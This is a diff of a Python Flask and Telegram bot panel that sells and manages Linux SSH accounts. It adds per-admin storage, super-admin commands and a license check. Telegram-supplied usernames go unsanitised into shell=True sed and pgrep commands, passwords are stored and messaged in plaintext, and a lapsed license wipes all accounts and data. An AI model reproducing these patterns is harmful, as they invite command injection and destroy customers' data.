-                            status_text = "✅ Online" if is_online else "❌ Offline"
-                            conf = get_evt_config()
-                            full_pubkey = get_full_pubkey()
-                            
-                            msg = f"""🔐 *User Information*
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-🔑 *Key:* `{user_key}`
-👤 *Username:* `{user_data['username']}`
-🔑 *Password:* `{user_data['password']}`
-📱 *Limit:* `{user_data['limit']}`
-📆 *Expiry:* `{user_data['expiry']}`
-📶 *Status:* {status_text}
-📊 *Online:* `{online_num}/{user_data['limit']}` devices
-🌐 *Domain:* {conf.get('DOMAIN')}
-📡 *NameServer:* {conf.get('NS_DOMAIN')}
-
-🔑 *Public Key:*
-`{full_pubkey}`
-
-📞 *Support:* @{TELEGRAM_BOT_USERNAME}"""
-                            send_telegram_message_fast(chat_id, msg)
-                        
-                        elif command == '/delete' and len(parts) >= 2:
-                            username = parts[1]
-                            keys = load_keys()
-                            found_key = None
-                            for key_id, data in keys.items():
-                                if data.get('username') == username and str(data.get('telegram_id')) == str(user_id):
-                                    found_key = key_id
-                                    break
-                            
-                            if not found_key:
-                                send_telegram_message_fast(chat_id, f"❌ User '{username}' not found!")
-                                continue
-                            
-                            subprocess.run(["userdel", "-f", username], capture_output=True)
-                            subprocess.run(f"sed -i '/^{username} hard/d' /etc/security/limits.conf", shell=True, capture_output=True)
-                            
-                            del keys[found_key]
-                            save_keys(keys)
-                            send_telegram_message_fast(chat_id, f"✅ User '{username}' deleted successfully!")
-                        
-                        elif command == '/ports':
-                            ports = get_live_ports()
-                            msg = "🔌 *Active Ports*\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-                            for name, port in ports.items():
-                                msg += f"• {name}: `{port}`\n"
-                            send_telegram_message_fast(chat_id, msg)
-                        
-                        else:
-                            msg = f"""❌ *Unknown Command*
-
-📌 *Available Commands:*
-/create - Create SSH user
-/list - List all users
-/info - Show user info
-/delete - Delete user
-/ports - Show active ports
-/myinfo - Show server info
-/pubkey - Show public keys
-
-📞 *Support:* @{TELEGRAM_BOT_USERNAME}"""
-                            send_telegram_message_fast(chat_id, msg)
-        except Exception as e:
-            pass
-        time.sleep(0.5)
-
-def run_telegram_bot():
-    """Run ultra-fast telegram bot"""
-    while True:
-        try:
-            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getMe"
-            requests.get(url, timeout=2)
-            check_telegram_updates_fast()
-        except:
-            pass
-        time.sleep(0.5)
-
-# ============================================
-# CORE FUNCTIONS
-# ============================================
 def get_evt_config():
     conf = {"DOMAIN": "Not Set", "NS_DOMAIN": "Not Set"}
     if os.path.exists(CONFIG_FILE):
@@ -1010,7 +488,7 @@ def sync_user_to_system(username, password, expiry, limit):
         return False
 
 def sync_all_users_to_system():
-    keys = load_keys()
+    keys = load_keys(None)
     synced_count = 0
     error_count = 0
     for key, user_data in keys.items():
@@ -1025,39 +503,568 @@ def sync_all_users_to_system():
                 error_count += 1
     return synced_count, error_count
 
-# ============================================
-# AUTO KILL BACKGROUND THREAD
-# ============================================
 def auto_kill_background():
+    """
+    Background thread to auto:
+    1. Delete expired users (by user expiry date)
+    2. Kill excess sessions (when online > limit)
+    3. Delete ALL data when IP license expires
+    """
     while True:
         try:
             current_date_str = date.today().strftime("%Y-%m-%d")
-            keys = load_keys()
-            keys_to_delete = []
-            for k, v in keys.items():
-                exp_date = v.get('expiry')
-                if exp_date and exp_date != "No Expiry":
-                    if exp_date < current_date_str:
-                        user = v.get('username')
-                        subprocess.run(["userdel", "-f", user], capture_output=True)
-                        subprocess.run(f"sed -i '/^{user} hard/d' /etc/security/limits.conf", shell=True, capture_output=True)
-                        keys_to_delete.append(k)
             
-            if keys_to_delete:
-                for k in keys_to_delete:
-                    del keys[k]
-                save_keys(keys)
-        except:
-            pass
-        time.sleep(5)
+            # ========================================
+            # PART 1: Delete expired USERS from ALL JSON files
+            # ========================================
+            deleted_any = False
+            
+            for filename in os.listdir(BASE_DIR):
+                if filename.endswith('.json') and filename not in ['authorized_tgids.json', 'active_sessions.json']:
+                    filepath = os.path.join(BASE_DIR, filename)
+                    try:
+                        with open(filepath, "r") as f:
+                            data = json.load(f)
+                            keys = data.get('keys', data) if isinstance(data, dict) else {}
+                        
+                        keys_to_delete = []
+                        for k, v in keys.items():
+                            exp_date = v.get('expiry')
+                            if exp_date and exp_date != "No Expiry":
+                                if exp_date < current_date_str:
+                                    user = v.get('username')
+                                    print(f"[AUTO-DELETE] Expired user: {user} (expiry: {exp_date})")
+                                    # Delete from system
+                                    subprocess.run(["userdel", "-f", user], capture_output=True)
+                                    subprocess.run(f"sed -i '/^{user} hard/d' /etc/security/limits.conf", shell=True, capture_output=True)
+                                    keys_to_delete.append(k)
+                                    deleted_any = True
+                        
+                        if keys_to_delete:
+                            for k in keys_to_delete:
+                                del keys[k]
+                            with open(filepath, "w") as f:
+                                json.dump({"keys": keys}, f, indent=4)
+                            print(f"[AUTO-DELETE] Deleted {len(keys_to_delete)} expired users from {filename}")
+                    except Exception as e:
+                        print(f"Error processing {filename}: {e}")
+            
+            # ========================================
+            # PART 2: Kill excess sessions (when online > limit)
+            # ========================================
+            all_keys = load_keys()
+            for k, v in all_keys.items():
+                user = v.get('username')
+                if not user:
+                    continue
+                limit = int(v.get('limit', 1))
+                
+                # Get all SSH and Dropbear processes for this user
+                pids_out = subprocess.getoutput(f"pgrep -u {user} 'sshd|dropbear' 2>/dev/null").strip()
+                pids = pids_out.split() if pids_out else []
+                
+                if len(pids) > limit:
+                    excess_pids = pids[limit:]
+                    print(f"[AUTO-KILL] User {user} has {len(pids)} sessions, limit {limit}. Killing {len(excess_pids)} excess sessions.")
+                    for pid in excess_pids:
+                        subprocess.run(["kill", "-9", pid], capture_output=True)
+            
+            # ========================================
+            # PART 3: Check IP LICENSE EXPIRY - Delete ALL if expired
+            # ========================================
+            try:
+                current_vps = get_current_vps_info()
+                if current_vps:
+                    license_expiry = current_vps.get('expiry')
+                    vps_ip = current_vps.get('vps_ip')
+                    
+                    if license_expiry and license_expiry not in ["No Expiry", "None"]:
+                        if license_expiry < current_date_str:
+                            print(f"\n[⚠️] ========================================")
+                            print(f"[⚠️] VPS LICENSE EXPIRED!")
+                            print(f"[⚠️] VPS IP: {vps_ip}")
+                            print(f"[⚠️] Expiry Date: {license_expiry}")
+                            print(f"[⚠️] Current Date: {current_date_str}")
+                            print(f"[⚠️] ========================================")
+                            
+                            # Send Telegram notification
+                            try:
+                                authorized_tgid = current_vps.get('authorized_tgid')
+                                if authorized_tgid:
+                                    msg = f"⚠️ *VPS LICENSE EXPIRED* ⚠️\n\n"
+                                    msg += f"🖥️ VPS IP: `{vps_ip}`\n"
+                                    msg += f"📅 Expiry Date: `{license_expiry}`\n"
+                                    msg += f"📅 Today: `{current_date_str}`\n\n"
+                                    msg += f"❌ Your license has expired. All data will be deleted.\n"
+                                    msg += f"📞 Please contact @{TELEGRAM_BOT_USERNAME} to renew."
+                                    send_telegram_message(authorized_tgid, msg)
+                            except:
+                                pass
+                            
+                            # Delete ALL users from ALL JSON files
+                            print(f"[AUTO-DELETE] License expired! Deleting ALL users...")
+                            total_deleted = 0
+                            
+                            for filename in os.listdir(BASE_DIR):
+                                if filename.endswith('.json') and filename not in ['authorized_tgids.json', 'active_sessions.json']:
+                                    filepath = os.path.join(BASE_DIR, filename)
+                                    try:
+                                        with open(filepath, "r") as f:
+                                            data = json.load(f)
+                                            keys = data.get('keys', data) if isinstance(data, dict) else {}
+                                        
+                                        # Delete each user from system
+                                        for k, v in keys.items():
+                                            username = v.get('username')
+                                            if username:
+                                                subprocess.run(["userdel", "-f", username], capture_output=True)
+                                                subprocess.run(f"sed -i '/^{username} hard/d' /etc/security/limits.conf", shell=True, capture_output=True)
+                                                total_deleted += 1
+                                        
+                                        # Clear the JSON file
+                                        with open(filepath, "w") as f:
+                                            json.dump({"keys": {}}, f, indent=4)
+                                    except Exception as e:
+                                        print(f"Error clearing {filename}: {e}")
+                            
+                            # Clear active sessions
+                            save_active_sessions({})
+                            
+                            # Delete main keys.json if exists
+                            if os.path.exists(KEYS_FILE):
+                                os.remove(KEYS_FILE)
+                            
+                            # Delete active_sessions.json
+                            if os.path.exists(ACTIVE_SESSIONS_FILE):
+                                os.remove(ACTIVE_SESSIONS_FILE)
+                            
+                            print(f"[AUTO-DELETE] Deleted {total_deleted} users total")
+                            print(f"[AUTO-DELETE] Removed all data files")
+                            print(f"[AUTO-DELETE] License expired. Shutting down EVT SSH Manager...")
+                            
+                            # Force exit after cleanup
+                            os._exit(1)
+                            
+            except Exception as e:
+                print(f"License check error in auto_kill: {e}")
+            
+        except Exception as e:
+            print(f"Auto-kill background error: {e}")
+        
+        time.sleep(5)  # Check every 30 seconds
 
 threading.Thread(target=auto_kill_background, daemon=True).start()
 
+def send_telegram_message(chat_id, text):
+    try:
+        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
+        payload = {'chat_id': chat_id, 'text': text, 'parse_mode': 'Markdown'}
+        requests.post(url, data=payload, timeout=10)
+    except Exception as e:
+        print(f"Send message error: {e}")
+
+def filter_keys_by_tgid(keys, tgid, is_super_admin=False):
+    if is_super_admin:
+        return keys
+    filtered = {}
+    for key, val in keys.items():
+        created_by = val.get('created_by_tgid') or val.get('telegram_id')
+        if str(created_by) == str(tgid):
+            filtered[key] = val
+    return filtered
+
+def check_telegram_updates():
+    global last_processed_update_ids
+    offset = None
+    processed_count = 0
+    OFFSET_FILE = os.path.join(BASE_DIR, "telegram_offset.txt")
+    
+    if os.path.exists(OFFSET_FILE):
+        try:
+            with open(OFFSET_FILE, "r") as f:
+                offset = int(f.read().strip())
+        except:
+            offset = None
+    
+    while True:
+        try:
+            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getUpdates"
+            params = {'timeout': 30}
+            if offset:
+                params['offset'] = offset
+            
+            response = requests.get(url, params=params, timeout=35)
+            if response.status_code == 200:
+                updates = response.json().get('result', [])
+                
+                for update in updates:
+                    update_id = update['update_id']
+                    
+                    if update_id in last_processed_update_ids:
+                        continue
+                    
+                    last_processed_update_ids.add(update_id)
+                    processed_count += 1
+                    
+                    if processed_count >= 100:
+                        if len(last_processed_update_ids) > 1000:
+                            last_processed_update_ids = set(list(last_processed_update_ids)[-500:])
+                        processed_count = 0
+                    
+                    message = update.get('message')
+                    if not message:
+                        if offset is None or update_id >= offset:
+                            offset = update_id + 1
+                            with open(OFFSET_FILE, "w") as f:
+                                f.write(str(offset))
+                        continue
+                    
+                    chat_id = message['chat']['id']
+                    text = message.get('text', '')
+                    user_id = message['from']['id']
+                    
+                    if not is_tgid_authorized(user_id):
+                        send_telegram_message(chat_id, "❌ Unauthorized! Please contact super admin.")
+                        if offset is None or update_id >= offset:
+                            offset = update_id + 1
+                            with open(OFFSET_FILE, "w") as f:
+                                f.write(str(offset))
+                        continue
+                    
+                    is_super_admin = str(user_id) == str(TELEGRAM_ADMIN_ID)
+                    
+                    if text.startswith('/'):
+                        parts = text.split()
+                        command = parts[0].lower()
+                        
+                        if command == '/start':
+                            msg = """🤖 *EVT SSH Manager Bot*
+
+📌 *Commands:*
+
+🔹 `/create username password days limit` - Create new SSH user
+🔹 `/list` - Show all your users
+🔹 `/info username` - Show user information
+🔹 `/delete username` - Delete user
+🔹 `/myinfo` - Show server & bot information
+🔹 `/ports` - Show active ports
+
+📝 *Examples:*
+`/create john pass123 30 2`
+`/info john`
+`/delete john`
+`/myinfo`"""
+                            send_telegram_message(chat_id, msg)
+                        
+                        elif command == '/myinfo':
+                            vps_ip = get_vps_ip()
+                            admin_uname = get_tgid_admin_username(user_id)
+                            all_keys = load_keys(None)
+                            filtered_keys = filter_keys_by_tgid(all_keys, user_id, is_super_admin)
+                            total_users = len(filtered_keys)
+                            online_count = 0
+                            for key, data in filtered_keys.items():
+                                username = data.get('username')
+                                if username:
+                                    is_online, _ = get_user_online_status(username)
+                                    if is_online:
+                                        online_count += 1
+                            
+                            msg = f"""📊 *Server Information*
+━━━━━━━━━━━━━━━
+🤖 *Telegram ID:* `{chat_id}`
+👑 *Super Admin:* {'✅ Yes' if is_super_admin else '❌ No'}
+👤 *Admin Username:* `{admin_uname}`
+🖥️ *Server IP:* `{vps_ip}`
+🌐 *Domain:* {get_evt_config().get('DOMAIN', 'Not Set')}
+📡 *NS Domain:* {get_evt_config().get('NS_DOMAIN', 'Not Set')}
+🔑 *Public Key:* {get_slowdns_pubkey()}
+
+📈 *Your Statistics*
+━━━━━━━━━━━━━━━
+👥 *Your Users:* `{total_users}`
+🟢 *Online Users:* `{online_count}`
+━━━━━━━━━━━━━━━
+📡 *EVT SSH Manager*"""
+                            send_telegram_message(chat_id, msg)
+                        
+                        elif command == '/create' and len(parts) >= 5:
+                            try:
+                                username = parts[1]
+                                password = parts[2]
+                                days = int(parts[3])
+                                limit = int(parts[4])
+                                if days < 1:
+                                    days = 30
+                                if limit < 1:
+                                    limit = 1
+                                
+                                admin_uname = get_tgid_admin_username(user_id)
+                                vps_ip = get_vps_ip()
+                                
+                                all_keys = load_keys(None)
+                                existing = False
+                                for k, v in all_keys.items():
+                                    if v.get('username') == username:
+                                        created_by = v.get('created_by_tgid') or v.get('telegram_id')
+                                        if is_super_admin or str(created_by) == str(user_id):
+                                            existing = True
+                                            break
+                                
+                                if existing:
+                                    send_telegram_message(chat_id, f"❌ Username '{username}' already exists!")
+                                    if offset is None or update_id >= offset:
+                                        offset = update_id + 1
+                                        with open(OFFSET_FILE, "w") as f:
+                                            f.write(str(offset))
+                                    continue
+                                
+                                expiry = (datetime.datetime.now() + datetime.timedelta(days=days)).strftime("%Y-%m-%d")
+                                key = "EVT-" + str(uuid.uuid4()).upper()[:8]
+                                
+                                if is_super_admin:
+                                    save_admin = "default"
+                                else:
+                                    save_admin = admin_uname
+                                
+                                keys = load_keys(save_admin)
+                                keys[key] = {
+                                    "username": username,
+                                    "password": password,
+                                    "expiry": expiry,
+                                    "limit": limit,
+                                    "created_by": admin_uname,
+                                    "created_by_tgid": str(user_id),
+                                    "telegram_id": str(user_id),
+                                    "vps_ip": vps_ip,
+                                    "created_at": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+                                }
+                                save_keys(keys, save_admin)
+                                sync_user_to_system(username, password, expiry, limit)
+                                
+                                domain = get_evt_config().get('DOMAIN', 'Not Set')
+                                ns_domain = get_evt_config().get('NS_DOMAIN', 'Not Set')
+                                pubkey = get_slowdns_pubkey()
+                                
+                                msg = f"""✅ *SSH Account Created!*
+🔑 Key: `{key}`
+👤 Username: `{username}`
+👤 Created by: `{admin_uname}`
+🔑 Password: `{password}`
+📆 Expiry: `{expiry}`
+📱 Limit: `{limit}`
+🌐 Domain: {domain}
+📡 NameServer: {ns_domain}
+🔑 Public Key: `{pubkey}`
+🖥️ VPS IP: `{vps_ip}`
+━━━━━━━━━━━━━━━
+📡 *EVT SSH Manager*"""
+                                send_telegram_message(chat_id, msg)
+                            except Exception as e:
+                                send_telegram_message(chat_id, f"❌ Error: {str(e)}")
+                        
+                        elif command == '/list':
+                            all_keys = load_keys(None)
+                            filtered_keys = filter_keys_by_tgid(all_keys, user_id, is_super_admin)
+                            
+                            if not filtered_keys:
+                                send_telegram_message(chat_id, "📭 No users found!")
+                                if offset is None or update_id >= offset:
+                                    offset = update_id + 1
+                                    with open(OFFSET_FILE, "w") as f:
+                                        f.write(str(offset))
+                                continue
+                            
+                            online_count = 0
+                            user_list = []
+                            for key, data in filtered_keys.items():
+                                username = data['username']
+                                is_online, _ = get_user_online_status(username)
+                                if is_online:
+                                    online_count += 1
+                                status_icon = "🟢" if is_online else "⚫"
+                                creator = data.get('created_by') or 'Unknown'
+                                vps_ip = data.get('vps_ip', 'Unknown')
+                                user_list.append(f"{status_icon} `{username}` | 👤 by: `{creator}` | 📅 {data['expiry']} | 📱 {data['limit']} | 🖥️ {vps_ip}")
+                            
+                            title = "All Users" if is_super_admin else "Your Users"
+                            msg = f"📋 *{title}*\n━━━━━━━━━━━━━━━\nTotal: {len(filtered_keys)} | Online: {online_count}\n━━━━━━━━━━━━━━━\n"
+                            msg += "\n".join(user_list[:50])
+                            send_telegram_message(chat_id, msg)
+                        
+                        elif command == '/info' and len(parts) >= 2:
+                            username = parts[1]
+                            all_keys = load_keys(None)
+                            
+                            user_data = None
+                            user_key = None
+                            for key, data in all_keys.items():
+                                if data.get('username') == username:
+                                    created_by = data.get('created_by_tgid') or data.get('telegram_id')
+                                    if is_super_admin or str(created_by) == str(user_id):
+                                        user_data = data
+                                        user_key = key
+                                        break
+                            
+                            if not user_data:
+                                send_telegram_message(chat_id, f"❌ User '{username}' not found!")
+                                if offset is None or update_id >= offset:
+                                    offset = update_id + 1
+                                    with open(OFFSET_FILE, "w") as f:
+                                        f.write(str(offset))
+                                continue
+                            
+                            is_online, online_num = get_user_online_status(username)
+                            status_text = "✅ Online" if is_online else "❌ Offline"
+                            pubkey = get_slowdns_pubkey()
+                            creator = user_data.get('created_by') or 'Unknown'
+                            vps_ip = user_data.get('vps_ip', 'Unknown')
+                            domain = get_evt_config().get('DOMAIN', 'Not Set')
+                            ns_domain = get_evt_config().get('NS_DOMAIN', 'Not Set')
+                            
+                            msg = f"""🔐 *User Information*
+🔑 Key: `{user_key}`
+👤 Username: `{user_data['username']}`
+👤 Created by: `{creator}`
+🔑 Password: `{user_data['password']}`
+📱 Limit: `{user_data['limit']}`
+📆 Expiry: `{user_data['expiry']}`
+📶 Status: {status_text}
+📊 Online: `{online_num}/{user_data['limit']}` devices
+🖥️ VPS IP: `{vps_ip}`
+🌐 Domain: {domain}
+📡 NameServer: {ns_domain}
+🔑 Public Key: `{pubkey}`"""
+                            send_telegram_message(chat_id, msg)
+                        
+                        elif command == '/delete' and len(parts) >= 2:
+                            username = parts[1]
+                            all_keys = load_keys(None)
+                            
+                            found_key = None
+                            found_file = None
+                            found_username = None
+                            
+                            for filename in os.listdir(BASE_DIR):
+                                if filename.endswith('.json') and filename not in ['authorized_tgids.json', 'active_sessions.json']:
+                                    filepath = os.path.join(BASE_DIR, filename)
+                                    try:
+                                        with open(filepath, "r") as f:
+                                            data = json.load(f)
+                                            keys = data.get('keys', data) if isinstance(data, dict) else {}
+                                        for key, val in keys.items():
+                                            if val.get('username') == username:
+                                                created_by = val.get('created_by_tgid') or val.get('telegram_id')
+                                                if is_super_admin or str(created_by) == str(user_id):
+                                                    found_key = key
+                                                    found_file = filename.replace('.json', '')
+                                                    found_username = username
+                                                    break
+                                        if found_key:
+                                            break
+                                    except:
+                                        pass
+                            
+                            if not found_key:
+                                send_telegram_message(chat_id, f"❌ User '{username}' not found or not authorized!")
+                                if offset is None or update_id >= offset:
+                                    offset = update_id + 1
+                                    with open(OFFSET_FILE, "w") as f:
+                                        f.write(str(offset))
+                                continue
+                            
+                            subprocess.run(["userdel", "-f", found_username], capture_output=True)
+                            subprocess.run(f"sed -i '/^{found_username} hard/d' /etc/security/limits.conf", shell=True, capture_output=True)
+                            
+                            file_keys = load_keys(found_file)
+                            if found_key in file_keys:
+                                del file_keys[found_key]
+                                save_keys(file_keys, found_file)
+                            
+                            send_telegram_message(chat_id, f"✅ User '{found_username}' deleted successfully!")
+                        
+                        elif command == '/ports':
+                            ports = get_live_ports()
+                            msg = "🔌 *Active Ports*\n━━━━━━━━━━━━━━━\n"
+                            for name, port in ports.items():
+                                msg += f"• {name}: `{port}`\n"
+                            send_telegram_message(chat_id, msg)
+                        
+                        elif command == '/addid' and is_super_admin:
+                            if len(parts) >= 3:
+                                try:
+                                    target_id = str(parts[1])
+                                    days = int(parts[2])
+                                    admin_uname = parts[3] if len(parts) >= 4 else target_id
+                                    expiry = (datetime.datetime.now() + datetime.timedelta(days=days)).strftime("%Y-%m-%d")
+                                    tgids = load_authorized_tgids()
+                                    tgids[target_id] = {
+                                        "expiry": expiry,
+                                        "admin_username": admin_uname,
+                                        "added_at": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+                                    }
+                                    save_authorized_tgids(tgids)
+                                    send_telegram_message(chat_id, f"✅ ID `{target_id}` (username: `{admin_uname}`) authorized until `{expiry}`")
+                                except Exception as e:
+                                    send_telegram_message(chat_id, f"❌ Error: {str(e)}")
+                            else:
+                                send_telegram_message(chat_id, "📝 Usage: `/addid tgid days [admin_username]`")
+                        
+                        elif command == '/removeid' and is_super_admin:
+                            if len(parts) >= 2:
+                                target_id = str(parts[1])
+                                tgids = load_authorized_tgids()
+                                if target_id in tgids:
+                                    del tgids[target_id]
+                                    save_authorized_tgids(tgids)
+                                    send_telegram_message(chat_id, f"✅ ID `{target_id}` removed.")
+                                else:
+                                    send_telegram_message(chat_id, "❌ ID not found.")
+                            else:
+                                send_telegram_message(chat_id, "📝 Usage: `/removeid tgid`")
+                        
+                        elif command == '/listid' and is_super_admin:
+                            tgids = load_authorized_tgids()
+                            if not tgids:
+                                send_telegram_message(chat_id, "📭 No authorized IDs found.")
+                            else:
+                                msg = "📋 *Authorized IDs:*\n"
+                                for tid, data in tgids.items():
+                                    msg += f"• `{tid}` | 👤 {data.get('admin_username', 'N/A')} | 📅 {data.get('expiry')}\n"
+                                send_telegram_message(chat_id, msg)
+                        
+                        else:
+                            send_telegram_message(chat_id, "❌ Unknown command. Type /start for help.")
+                    
+                    if offset is None or update_id >= offset:
+                        offset = update_id + 1
+                        with open(OFFSET_FILE, "w") as f:
+                            f.write(str(offset))
+                    
+                    time.sleep(0.1)
+                    
+            else:
+                time.sleep(2)
+                
+        except Exception as e:
+            print(f"Telegram error: {e}")
+            time.sleep(3)
+
+def run_telegram_bot():
+    while True:
+        try:
+            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getMe"
+            requests.get(url, timeout=5)
+            check_telegram_updates()
+        except Exception as e:
+            print(f"Telegram bot error: {e}")
+        time.sleep(1)
+
 def auto_limit_check():
-    """Background task to check login limits every 3 seconds"""
     while True:
         try:
             cleanup_expired_sessions()
+            cleanup_expired_tgids()
             valid, _, license_data = check_license_from_github()
             if valid and license_data:
                 license_key = license_data.get('license_key')
@@ -1085,10 +1092,8 @@ def auto_limit_check():
             print(f"Auto-limit check error: {e}")
         time.sleep(3)
 
-# ============================================
-# LOGIN HTML
-# ============================================
-LOGIN_HTML = """<!DOCTYPE html>
+LOGIN_HTML = """
+<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
@@ -1114,6 +1119,7 @@ LOGIN_HTML = """<!DOCTYPE html>
         .vps-ip { text-align: center; margin-bottom: 20px; padding: 8px; background: rgba(0,0,0,0.5); border-radius: 8px; font-size: 13px; }
         .vps-ip i { color: var(--gold); margin-right: 5px; }
         .vps-ip span { color: #28a745; font-family: monospace; }
+        .form-check-input:checked { background-color: var(--gold); border-color: var(--gold); }
         .session-full { border-color: #dc3545 !important; background: rgba(220,53,69,0.1) !important; }
         .session-warning { border-color: #ffc107 !important; background: rgba(255,193,7,0.07) !important; }
         .session-ok { border-color: #28a745 !important; background: rgba(40,167,69,0.1) !important; }
@@ -1169,7 +1175,7 @@ LOGIN_HTML = """<!DOCTYPE html>
             <p class="text-danger small text-center mt-2" id="limit-msg" style="display:none"></p>
         </form>
         <div class="mt-3 text-center">
-            <small class="text-secondary">© 2026 EVT SSH Manager | Contact: @evtvpnpro</small>
+            <small class="text-secondary">© 2026 EVT SSH Manager</small>
         </div>
     </div>
     <script>
@@ -1217,10 +1223,10 @@ LOGIN_HTML = """<!DOCTYPE html>
                     
                     if (limit > 0 && active >= limit) {
                         display.className = 'fw-bold text-danger';
-                        statusText.textContent = '🔴 Session limit reached';
+                        statusText.textContent = '🔴 လူပြည့်နေပြီ';
                         statusText.style.color = '#dc3545';
                         box.className = 'vps-ip session-full';
-                        limitMsg.textContent = 'License limit exceeded (' + active + '/' + limit + '). Cannot login.';
+                        limitMsg.textContent = 'ဝယ်ယူထားသော limit အထက် (' + active + '/' + limit + '). ပိုသုံးခွင့်မပြုပါ';
                         limitMsg.style.display = 'block';
                         enableLoginButton(false);
                     } else if (limit > 0 && active > 0) {
@@ -1232,7 +1238,7 @@ LOGIN_HTML = """<!DOCTYPE html>
                         enableLoginButton(true);
                     } else {
                         display.className = 'fw-bold text-success';
-                        statusText.textContent = '✅ Ready to login';
+                        statusText.textContent = '✅ ဝင်ရောက်ပါ';
                         statusText.style.color = '#28a745';
                         box.className = 'vps-ip session-ok';
                         limitMsg.style.display = 'none';
@@ -1340,10 +1346,8 @@ LOGIN_HTML = """<!DOCTYPE html>
 </html>
 """
 
-# ============================================
-# DASHBOARD HTML
-# ============================================
-DASHBOARD_HTML = """<!DOCTYPE html>
+DASHBOARD_HTML = """
+<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
@@ -1413,6 +1417,7 @@ DASHBOARD_HTML = """<!DOCTYPE html>
         .license-info-bar { background: rgba(0,0,0,0.8); border-left: 4px solid var(--gold); padding: 10px 15px; margin-bottom: 20px; border-radius: 8px; }
         .admin-badge { background: var(--gold); color: #000; padding: 2px 8px; border-radius: 20px; font-size: 11px; font-weight: bold; margin-left: 10px; }
         .creator-badge { color: #aaa; font-size: 11px; margin-left: 8px; }
+        .file-badge { background: #2c3e50; color: #FFD700; padding: 2px 6px; border-radius: 12px; font-size: 10px; margin-left: 8px; }
     </style>
 </head>
 <body>
@@ -1429,7 +1434,7 @@ DASHBOARD_HTML = """<!DOCTYPE html>
         <div class="license-info-bar">
             <div class="row">
                 <div class="col-md-3"><small class="text-warning">🌐 VPS IP</small><br><strong>{{ license_info.vps_ip }}</strong></div>
-                <div class="col-md-3"><small class="text-warning">👤 ADMIN</small><br><strong>{{ license_info.admin_username }}</strong></div>
+                <div class="col-md-3"><small class="text-warning">👤 ADMIN</small><br><strong>{{ license_info.admin_username }} <span class="admin-badge">{{ "Super Admin" if is_super_admin else "Admin" }}</span></strong></div>
                 <div class="col-md-3"><small class="text-warning">🆔 TELEGRAM ID</small><br><strong>{{ license_info.telegram_id or 'Not Linked' }}</strong></div>
                 <div class="col-md-3"><small class="text-warning">📅 EXPIRY</small><br><strong class="{% if license_info.expiry != 'No Expiry' and license_info.expiry < today %}text-danger{% else %}text-success{% endif %}">{{ license_info.expiry }}</strong></div>
             </div>
@@ -1499,6 +1504,8 @@ DASHBOARD_HTML = """<!DOCTYPE html>
                                 <i class="fas fa-user-circle me-2"></i>{{ val.username }}
                                 {% if val.telegram_id %}
                                     <small class="creator-badge">(by: {{ val.telegram_id }})</small>
+                                {% elif val.created_by %}
+                                    <small class="creator-badge">(by: {{ val.created_by }})</small>
                                 {% endif %}
                             </td>
                             <td><span class="password-cell" id="pass-{{ key }}">••••••••</span> <i class="fas fa-eye-slash ms-2 text-secondary" id="icon-{{ key }}" style="cursor:pointer" onclick="togglePass('{{ key }}', '{{ val.password }}')"></i></td>
@@ -1578,9 +1585,6 @@ DASHBOARD_HTML = """<!DOCTYPE html>
 </html>
 """
 
-# ============================================
-# FLASK ROUTES
-# ============================================
 @app.route('/', methods=['GET', 'POST'])
 def login():
     if current_user.is_authenticated:
@@ -1657,6 +1661,10 @@ def admin_dashboard():
     current_admin_username = current_user.admin_username if hasattr(current_user, 'admin_username') else current_user.username
     current_telegram_id = current_user.telegram_id if hasattr(current_user, 'telegram_id') else None
     
+    is_super_admin = False
+    if current_telegram_id and str(current_telegram_id) == str(TELEGRAM_ADMIN_ID):
+        is_super_admin = True
+    
     license_info = {
         'vps_ip': license_data.get('vps_ip', 'Unknown'),
         'expiry': license_data.get('expiry', 'No Expiry'),
@@ -1666,11 +1674,11 @@ def admin_dashboard():
         'license_key': license_data.get('license_key', 'Unknown'),
     }
     
-    # Load all keys and filter by telegram_id
-    all_keys = load_keys()
+    all_keys = load_keys(None)
     filtered_keys = {}
     for key, val in all_keys.items():
-        if str(val.get('telegram_id')) == str(current_telegram_id):
+        created_by = val.get('created_by_tgid') or val.get('telegram_id')
+        if is_super_admin or str(created_by) == str(current_telegram_id):
             filtered_keys[key] = val
     
     online_users = 0
@@ -1701,7 +1709,7 @@ def admin_dashboard():
         "online": online_users
     }
     
-    return render_template_string(DASHBOARD_HTML, info=info, keys=filtered_keys, ports=get_live_ports(), config=get_evt_config(), dns_key=get_slowdns_pubkey(), license_info=license_info, today=today, active_sessions=active_count)
+    return render_template_string(DASHBOARD_HTML, info=info, keys=filtered_keys, ports=get_live_ports(), config=get_evt_config(), dns_key=get_slowdns_pubkey(), license_info=license_info, today=today, active_sessions=active_count, is_super_admin=is_super_admin)
 
 @app.route('/gen_key', methods=['POST'])
 @login_required
@@ -1723,26 +1731,31 @@ def gen_key():
         flash("Username and Password are required!", "danger")
         return redirect(url_for('admin_dashboard'))
     
+    current_admin_username = current_user.admin_username if hasattr(current_user, 'admin_username') else current_user.username
     current_telegram_id = current_user.telegram_id if hasattr(current_user, 'telegram_id') else None
+    is_super_admin = (current_telegram_id and str(current_telegram_id) == str(TELEGRAM_ADMIN_ID))
     
-    keys = load_keys()
+    save_admin = "default" if is_super_admin else current_admin_username
+    keys = load_keys(save_admin)
     
     if any(v.get('username') == username for v in keys.values()):
         flash(f"Error: Username '{username}' already exists!", "danger")
         return redirect(url_for('admin_dashboard'))
     
     expiry = (datetime.datetime.now() + datetime.timedelta(days=days)).strftime("%Y-%m-%d")
-    key_id = "EVT-" + str(uuid.uuid4()).upper()[:8]
+    key = "EVT-" + str(uuid.uuid4()).upper()[:8]
     
-    keys[key_id] = {
+    keys[key] = {
         "username": username,
         "password": password,
         "expiry": expiry,
         "limit": limit,
+        "created_by": current_admin_username,
+        "created_by_tgid": str(current_telegram_id) if current_telegram_id else None,
         "telegram_id": str(current_telegram_id) if current_telegram_id else None,
